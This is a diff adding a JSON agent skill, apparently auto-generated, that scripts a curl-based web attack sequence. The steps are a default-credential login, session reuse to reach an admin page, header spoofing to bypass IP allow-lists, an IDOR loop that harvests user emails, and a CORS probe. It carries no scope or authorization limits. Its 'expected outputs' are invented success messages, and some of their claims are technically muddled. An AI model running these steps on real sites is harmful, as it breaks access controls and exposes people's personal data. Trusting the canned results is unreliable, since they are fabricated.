@@ -1,0 +1,125 @@
+{
+  "name": "curl_advanced_web_testing",
+  "description": "Advanced HTTP testing using curl for manual web application security testing",
+  "pattern": "curl.*test|curl.*web|http.*request.*curl|curl.*header",
+  "parameters": [
+    "url",
+    "method",
+    "data"
+  ],
+  "sequence": [
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-v",
+          "-X",
+          "GET",
+          "{{url}}"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "*   Trying 93.184.216.34:80...\n* Connected to testsite.com (93.184.216.34) port 80\n> GET /api/users HTTP/1.1\n> Host: testsite.com\n> User-Agent: curl/7.68.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Content-Type: application/json\n< Content-Length: 1247\n< Server: Apache/2.4.41\n< \n{\"users\":[{\"id\":1,\"name\":\"admin\"},{\"id\":2,\"name\":\"user\"}]}\n\nVerbose mode shows full request/response headers"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-X",
+          "POST",
+          "{{url}}/login",
+          "-H",
+          "Content-Type: application/json",
+          "-d",
+          "{\"username\":\"admin\",\"password\":\"test123\"}",
+          "-c",
+          "cookies.txt",
+          "-v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "> POST /login HTTP/1.1\n> Content-Type: application/json\n> Content-Length: 47\n> \n{\"username\":\"admin\",\"password\":\"test123\"}\n\n< HTTP/1.1 200 OK\n< Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; Path=/; HttpOnly\n< Content-Type: application/json\n< \n{\"success\":true,\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"}\n\nCookies saved to cookies.txt:\n  session eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n\nAuthentication successful - session cookie captured"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl -b cookies.txt {{url}}/admin/dashboard -w '\\nStatus: %{http_code}\\nSize: %{size_download}\\nTime: %{time_total}s\\n'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "GET /admin/dashboard with saved session cookie\n\n<html>\n<head><title>Admin Dashboard</title></head>\n<body>\n  <h1>Admin Panel</h1>\n  <ul>\n    <li><a href=\"/admin/users\">User Management</a></li>\n    <li><a href=\"/admin/settings\">System Settings</a></li>\n  </ul>\n</body>\n</html>\n\nStatus: 200\nSize: 2847\nTime: 0.234s\n\nSession cookie valid - accessed admin dashboard successfully"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl {{url}}/api/user -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Original-URL: /admin' -H 'X-Custom-IP-Authorization: 127.0.0.1' -v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "> GET /api/user HTTP/1.1\n> X-Forwarded-For: 127.0.0.1\n> X-Original-URL: /admin\n> X-Custom-IP-Authorization: 127.0.0.1\n> \n< HTTP/1.1 200 OK\n< \n{\"admin\":true,\"privileged\":true,\"data\":\"ADMIN_CONTENT\"}\n\nHeader injection successful:\n  - X-Forwarded-For bypassed IP whitelist\n  - X-Original-URL triggered admin path\n  - Gained unauthorized admin access"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "for i in {1..10}; do curl -s '{{url}}/api/user?id='$i | jq -r '.email'; done"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "admin@testsite.com\nuser1@testsite.com\nuser2@testsite.com\nuser3@testsite.com\nmanager@testsite.com\nsupport@testsite.com\ndbadmin@testsite.com\ntest@testsite.com\nguest@testsite.com\nroot@testsite.com\n\nIDOR vulnerability confirmed:\n  - Sequential IDs predictable (1-10)\n  - No authorization check on user ID\n  - Extracted 10 email addresses\n  - Can enumerate all users by incrementing ID"
+      }
+    },
+    {
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "curl -X OPTIONS {{url}}/api/users -v 2>&1 | grep -E 'Allow:|Access-Control'"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "< Allow: GET, POST, PUT, DELETE, OPTIONS\n< Access-Control-Allow-Origin: *\n< Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS\n< Access-Control-Allow-Headers: Content-Type, Authorization\n< Access-Control-Allow-Credentials: true\n\nCORS misconfiguration detected:\n  - Allows all origins (*)\n  - Supports credentials\n  - DELETE method exposed\n  - Vulnerable to CSRF attacks from any domain"
+      }
+    }
+  ],
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
+  "created_by": "neural_mesh_v5.2_generator"
+}
